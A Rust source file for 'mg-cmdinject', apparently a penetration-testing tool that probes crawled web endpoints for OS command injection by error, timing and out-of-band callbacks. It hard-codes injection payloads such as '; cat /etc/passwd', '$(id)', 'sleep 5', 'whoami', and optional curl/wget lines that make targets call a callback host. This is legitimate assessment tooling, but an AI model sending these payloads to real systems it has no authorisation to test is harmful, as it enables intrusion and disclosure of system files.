/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-cmdinject — OS command injection detection.
 *                  Blind (OOB DNS/HTTP), error-based, and time-based
 *                  detection strategies applied to crawl corpus endpoints.
 * Notes:           Error-based probes run concurrently via JoinSet.
 *                  Time-based probes baseline first, then run timed
 *                  payloads sequentially to avoid skewed measurements.
 *                  OOB detection reads callbacks from the engagement
 *                  oob/ directory written by mg-oob.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;
use tokio::time::Instant;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "cmdinject";
const AUDIT_TOOL: &str = "mg-cmdinject";
const OOB_SUBDIR: &str = "oob";
// Baseline samples to establish expected response time
const BASELINE_SAMPLE_COUNT: u32 = 3;
// Benign value used for baseline requests
const BASELINE_VALUE: &str = "1";

// Error-based payloads — Unix
const ERROR_PAYLOADS_UNIX: &[&str] = &[
    ";id",
    "|id",
    "&&id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
];

// Error-based payloads — Windows
const ERROR_PAYLOADS_WIN: &[&str] = &[
    "& whoami",
    "| whoami",
    "&& whoami",
];

// Time-based payloads — Unix
const TIME_PAYLOADS_UNIX: &[&str] = &[
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
];

// Time-based payloads — Windows
const TIME_PAYLOADS_WIN: &[&str] = &[
    "& timeout /t 5",
    "| timeout /t 5",
];

// Strings in response body that indicate Unix command execution
const ERROR_INDICATORS_UNIX: &[&str] = &[
    "uid=",
    "root:",
    "daemon:",
    "/bin/sh",
    "/etc/passwd",
];

// Strings in response body that indicate Windows command execution
const ERROR_INDICATORS_WIN: &[&str] = &[
    "WINDOWS\\",
    "NT AUTHORITY",
    "System32",
    "Users\\",
];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-cmdinject",
    about = "OS command injection detection — error-based, time-based, and OOB"
)]
struct Args {
    /// Engagement name (must have crawl output)
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent probes
    #[arg(long, default_value_t = 8)]
    concurrency: usize,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 20)]
    timeout: u64,

    /// OOB callback URL from mg-oob (optional)
    #[arg(long)]
    oob_url: Option<String>,

    /// Milliseconds above baseline to flag as time-based command injection
    #[arg(long, default_value_t = 4500)]
    time_threshold: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Mirrors the EndpointMatch shape written by mg-crawl
#[derive(Deserialize)]
struct EndpointMatch {
    path: String,
    #[serde(default)]
    params: Vec<String>,
    #[serde(default = "default_method")]
    method: String,
}

// Injectable point derived from an endpoint
#[derive(Debug, Clone)]
struct InjectablePoint {
    base_url: String,
    param: String,
    method: String,
}

// Classification of an error-based probe result
#[derive(Debug, Serialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
enum ErrorVerdict {
    Confirmed,
    Miss,
}

// Classification of a time-based probe result
#[derive(Debug, Serialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
enum TimeVerdict {
    Confirmed,
    Miss,
}

// Result of one error-based probe
#[derive(Debug, Serialize)]
struct ErrorResult {
    url: String,
    param: String,
    method: String,
    payload: String,
    verdict: ErrorVerdict,
    indicator: Option<String>,
    body_snippet: String,
}

// Result of one time-based probe series
#[derive(Debug, Serialize)]
struct TimeResult {
    url: String,
    param: String,
    method: String,
    payload: String,
    baseline_ms: u64,
    response_ms: u64,
    verdict: TimeVerdict,
}

// Top-level output written to disk
#[derive(Serialize)]
struct CmdinjectResults {
    engagement: String,
    timestamp: String,
    error_probes: usize,
    time_probes: usize,
    error_confirmed: usize,
    time_confirmed: usize,
    oob_token: Option<String>,
    error_results: Vec<ErrorResult>,
    time_results: Vec<TimeResult>,
}

// Shape of the callbacks file written by mg-oob
#[derive(Deserialize)]
struct OobOutput {
    #[allow(dead_code)]
    callbacks: Vec<OobCallback>,
}

#[derive(Deserialize)]
struct OobCallback {
    path: String,
    #[allow(dead_code)]
    hit: bool,
}

// ── Helpers ──────────────────────────────────────────────────────────────────

// Return default HTTP method for deserialization
fn default_method() -> String {
    "GET".to_string()
}

// Return current UTC timestamp as RFC 3339
fn now_rfc3339() -> String {
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "unknown".into())
}

// Sanitize a timestamp string for use in a filename (colons → underscores)
fn ts_for_filename(ts: &str) -> String {
    ts.chars()
        .map(|c| if c == ':' { '_' } else { c })
        .collect()
}

// Collect injectable points from crawl host directories
fn collect_endpoints(crawl_dir: &Path) -> Vec<InjectablePoint> {
    let mut points = Vec::new();
    let Ok(hosts) = fs::read_dir(crawl_dir) else {
        return points;
    };
    for entry in hosts.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let ep_path = entry.path().join("endpoints.json");
        let Ok(raw) = fs::read_to_string(&ep_path) else {
            continue;
        };
        let Ok(eps): Result<Vec<EndpointMatch>, _> = serde_json::from_str(&raw) else {
            continue;
        };
        for ep in eps {
            if ep.method != "GET" && ep.method != "POST" {
                continue;
            }
            for param in &ep.params {
                points.push(InjectablePoint {
                    base_url: ep.path.split('?').next().unwrap_or(&ep.path).to_string(),
                    param: param.clone(),
                    method: ep.method.clone(),
                });
            }
        }
    }
    points
}

// Minimal percent-encoding for payload values in query strings
fn urlencoding_simple(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            ' ' => out.push_str("%20"),
            '&' => out.push_str("%26"),
            '#' => out.push_str("%23"),
            '|' => out.push_str("%7C"),
            ';' => out.push_str("%3B"),
            '`' => out.push_str("%60"),
            '$' => out.push_str("%24"),
            _ => out.push(c),
        }
    }
    out
}

// Send one GET or POST request with an injected payload; return (body, elapsed_ms)
async fn send_injected(
    client: &reqwest::Client,
    point: &InjectablePoint,
    payload: &str,
) -> (String, u64) {
    let start = Instant::now();
    let result = if point.method == "POST" {
        let body_str = format!("{}={}", point.param, urlencoding_simple(payload));
        client
            .post(&point.base_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body_str)
            .send()
            .await
    } else {
        let url = format!(
            "{}?{}={}",
            point.base_url,
            point.param,
            urlencoding_simple(payload)
        );
        client.get(&url).send().await
    };
    let elapsed = start.elapsed().as_millis() as u64;
    match result {
        Ok(resp) => (resp.text().await.unwrap_or_default(), elapsed),
        Err(_) => (String::new(), elapsed),
    }
}

// Check response body for command execution indicators; return matched indicator or None
fn detect_indicator(body: &str) -> Option<&'static str> {
    ERROR_INDICATORS_UNIX
        .iter()
        .chain(ERROR_INDICATORS_WIN.iter())
        .find(|ind| body.contains(*ind))
        .copied()
}

// Probe one injectable point with one error-based payload
async fn probe_error(
    client: reqwest::Client,
    point: InjectablePoint,
    payload: String,
) -> ErrorResult {
    let (body, _) = send_injected(&client, &point, &payload).await;
    let snippet: String = body.chars().take(512).collect();
    let indicator = detect_indicator(&body).map(|s| s.to_string());
    let verdict = if indicator.is_some() {
        ErrorVerdict::Confirmed
    } else {
        ErrorVerdict::Miss
    };
    ErrorResult {
        url: point.base_url,
        param: point.param,
        method: point.method,
        payload,
        verdict,
        indicator,
        body_snippet: snippet,
    }
}

// Establish baseline response time for an injectable point
async fn baseline_ms(client: &reqwest::Client, point: &InjectablePoint) -> u64 {
    let mut total = 0u64;
    for _ in 0..BASELINE_SAMPLE_COUNT {
        let (_, ms) = send_injected(client, point, BASELINE_VALUE).await;
        total += ms;
    }
    total / u64::from(BASELINE_SAMPLE_COUNT)
}

// Probe one injectable point with all time-based payloads
async fn probe_time_series(
    client: reqwest::Client,
    point: InjectablePoint,
    threshold_ms: u64,
) -> Vec<TimeResult> {
    let base_ms = baseline_ms(&client, &point).await;
    let mut results = Vec::new();

    let all_time_payloads: Vec<&str> = TIME_PAYLOADS_UNIX
        .iter()
        .chain(TIME_PAYLOADS_WIN.iter())
        .copied()
        .collect();

    for payload in &all_time_payloads {
        let (_, elapsed) = send_injected(&client, &point, payload).await;
        let verdict = if elapsed > base_ms + threshold_ms {
            TimeVerdict::Confirmed
        } else {
            TimeVerdict::Miss
        };
        results.push(TimeResult {
            url: point.base_url.clone(),
            param: point.param.clone(),
            method: point.method.clone(),
            payload: payload.to_string(),
            baseline_ms: base_ms,
            response_ms: elapsed,
            verdict,
        });
    }

    results
}

// Check OOB callbacks file for a token; return true if token appears in any callback path
fn check_oob_token(oob_dir: &Path, token: &str) -> bool {
    let Ok(entries) = fs::read_dir(oob_dir) else {
        return false;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
        }
        let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if !name.starts_with("callbacks-") {
            continue;
        }
        let Ok(raw) = fs::read_to_string(&path) else {
            continue;
        };
        let Ok(output): Result<OobOutput, _> = serde_json::from_str(&raw) else {
            continue;
        };
        if output.callbacks.iter().any(|cb| cb.path.contains(token)) {
            return true;
        }
    }
    false
}

// ── Entry point ──────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let points = collect_endpoints(&eng.crawl_dir());
    if points.is_empty() {
        anyhow::bail!(
            "no injectable endpoints found — run `mg-crawl {}` first",
            args.engagement
        );
    }

    eprintln!(
        "mg-cmdinject: {} injectable points, concurrency={}",
        points.len(),
        args.concurrency
    );

    let auth_headers = session::get_auth_headers(&eng)
        .await
        .context("load session auth headers")?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .default_headers(auth_headers)
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    // Build effective error-payload list, appending OOB payloads if requested
    let oob_token = args.oob_url.as_ref().map(|_| format!("cmdi-{:08x}", std::process::id()));
    let mut all_error_payloads: Vec<String> = ERROR_PAYLOADS_UNIX
        .iter()
        .chain(ERROR_PAYLOADS_WIN.iter())
        .map(|s| s.to_string())
        .collect();

    if let (Some(oob_url), Some(token)) = (&args.oob_url, &oob_token) {
        all_error_payloads.push(format!("; curl {oob_url}/{token}"));
        all_error_payloads.push(format!(
            "| wget {oob_url}/{token} -q -O /dev/null"
        ));
    }

    // ── Error-based probes (concurrent) ──────────────────────────────────────
    let mut join_set: JoinSet<ErrorResult> = JoinSet::new();
    let mut error_results: Vec<ErrorResult> = Vec::new();

    for point in &points {
        for payload in &all_error_payloads {
            // Drain when at concurrency ceiling
            if join_set.len() >= args.concurrency
                && let Some(Ok(r)) = join_set.join_next().await
            {
                error_results.push(r);
            }
            let c = client.clone();
            let pt = point.clone();
            let pld = payload.clone();
            join_set.spawn(probe_error(c, pt, pld));
        }
    }
    while let Some(Ok(r)) = join_set.join_next().await {
        error_results.push(r);
    }

    // ── Time-based probes (sequential per point, concurrent across points) ───
    let mut time_join_set: JoinSet<Vec<TimeResult>> = JoinSet::new();
    let mut time_results: Vec<TimeResult> = Vec::new();
    let threshold = args.time_threshold;

    for point in points.clone() {
        if time_join_set.len() >= args.concurrency
            && let Some(Ok(mut rs)) = time_join_set.join_next().await
        {
            time_results.append(&mut rs);
        }
        let c = client.clone();
        time_join_set.spawn(probe_time_series(c, point, threshold));
    }
    while let Some(Ok(mut rs)) = time_join_set.join_next().await {
        time_results.append(&mut rs);
    }

    // ── OOB check ────────────────────────────────────────────────────────────
    if let Some(ref token) = oob_token {
        let oob_dir = eng.root.join(OOB_SUBDIR);
        if check_oob_token(&oob_dir, token) {
            eprintln!("  [OOB HIT] token {token} found in oob callbacks");
        }
    }

    // Print confirmed findings
    for r in &error_results {
        if r.verdict == ErrorVerdict::Confirmed {
            eprintln!(
                "  [error-cmdi] {} param={} indicator={} payload={}",
                r.url,
                r.param,
                r.indicator.as_deref().unwrap_or("unknown"),
                r.payload
            );
        }
    }
    for r in &time_results {
        if r.verdict == TimeVerdict::Confirmed {
            eprintln!(
                "  [time-cmdi] {} param={} baseline={}ms response={}ms payload={}",
                r.url, r.param, r.baseline_ms, r.response_ms, r.payload
            );
        }
    }

    let error_confirmed = error_results
        .iter()
        .filter(|r| r.verdict == ErrorVerdict::Confirmed)
        .count();
    let time_confirmed = time_results
        .iter()
        .filter(|r| r.verdict == TimeVerdict::Confirmed)
        .count();

    let ts = now_rfc3339();
    let ts_file = ts_for_filename(&ts);

    let output = CmdinjectResults {
        engagement: args.engagement.clone(),
        timestamp: ts.clone(),
        error_probes: error_results.len(),
        time_probes: time_results.len(),
        error_confirmed,
        time_confirmed,
        oob_token: oob_token.clone(),
        error_results,
        time_results,
    };

    let output_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&output_dir).context("create cmdinject output dir")?;

    let results_path = output_dir.join(format!("results-{ts_file}.json"));
    fs::write(
        &results_path,
        serde_json::to_string_pretty(&output).context("serialize output")?,
    )
    .context("write cmdinject results JSON")?;

    eprintln!(
        "mg-cmdinject: error_confirmed={} time_confirmed={} — {}",
        output.error_confirmed,
        output.time_confirmed,
        results_path.display()
    );

    // Write findings for confirmed error-based command injection
    for r in output.error_results.iter().filter(|r| r.verdict == ErrorVerdict::Confirmed) {
        let tf = ToolFinding::new("mg-cmdinject", "OS Command Injection (Error-Based)", FindingSeverity::High)
            .url(r.url.clone())
            .parameter(r.param.clone())
            .evidence(format!("indicator={} payload={}", r.indicator.as_deref().unwrap_or("unknown"), r.payload))
            .recommendation("Never pass user input to shell execution functions; use allowlists and argument arrays");
        let _ = write_finding(&eng, &tf);
    }
    // Write findings for confirmed time-based command injection
    for r in output.time_results.iter().filter(|r| r.verdict == TimeVerdict::Confirmed) {
        let tf = ToolFinding::new("mg-cmdinject", "OS Command Injection (Time-Based Blind)", FindingSeverity::High)
            .url(r.url.clone())
            .parameter(r.param.clone())
            .evidence(format!("payload={} baseline={}ms response={}ms", r.payload, r.baseline_ms, r.response_ms))
            .recommendation("Never pass user input to shell execution functions; use allowlists and argument arrays");
        let _ = write_finding(&eng, &tf);
    }

    let _ = eng.audit(
        AUDIT_TOOL,
        &eng.meta.target,
        Some(&format!(
            "error_confirmed={} time_confirmed={} oob={} ts={ts}",
            output.error_confirmed,
            output.time_confirmed,
            oob_token.is_some()
        )),
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_indicator_finds_unix_uid() {
        let body = "uid=0(root) gid=0(root) groups=0(root)";
        assert_eq!(detect_indicator(body), Some("uid="));
    }

    #[test]
    fn detect_indicator_finds_unix_passwd() {
        let body = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";
        assert!(detect_indicator(body).is_some());
    }

    #[test]
    fn detect_indicator_finds_windows_authority() {
        let body = "NT AUTHORITY\\SYSTEM";
        assert_eq!(detect_indicator(body), Some("NT AUTHORITY"));
    }

    #[test]
    fn detect_indicator_returns_none_for_clean_body() {
        let body = "<html><body>Hello world!</body></html>";
        assert!(detect_indicator(body).is_none());
    }

    #[test]
    fn urlencoding_simple_encodes_shell_metacharacters() {
        assert!(urlencoding_simple(";id").contains("%3B"));
        assert!(urlencoding_simple("|id").contains("%7C"));
        assert!(urlencoding_simple("$(id)").contains("%24"));
    }

    #[test]
    fn ts_for_filename_replaces_colons() {
        assert_eq!(ts_for_filename("2026-05-17T12:00:00Z"), "2026-05-17T12_00_00Z");
    }

    #[test]
    fn time_payloads_cover_both_platforms() {
        let unix_count = TIME_PAYLOADS_UNIX.len();
        let win_count = TIME_PAYLOADS_WIN.len();
        assert!(unix_count >= 4);
        assert!(win_count >= 2);
    }

    #[test]
    fn error_payloads_cover_both_platforms() {
        let unix_count = ERROR_PAYLOADS_UNIX.len();
        let win_count = ERROR_PAYLOADS_WIN.len();
        assert_eq!(unix_count, 7);
        assert_eq!(win_count, 3);
    }
}
